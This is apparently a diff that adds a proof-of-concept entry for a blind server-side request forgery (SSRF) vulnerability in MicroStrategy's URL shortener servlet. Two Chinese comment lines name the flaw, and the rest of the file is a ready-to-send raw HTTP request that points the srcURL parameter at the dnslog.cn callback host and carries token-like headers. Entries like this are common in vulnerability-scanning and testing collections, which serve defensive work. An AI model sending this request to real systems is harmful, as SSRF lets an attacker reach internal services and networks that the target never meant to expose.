@@ -1,0 +1,9 @@
+# MicroStrategy tinyurl服务器请求伪造漏洞
+# MicroStrategy URL缩短器上的盲服务器端（SSRF）请求伪造漏洞。
+GET /servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=http://dnslog.cn&acid=80001704&bid=hd_tag_m8mv25gv HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25gv
+RM-PRO-Token: c5336ede7866407c14d52d3959ac33be
+RM-PRO-Time: 1742808468097
+User-Agent: curl/7.83.1
+
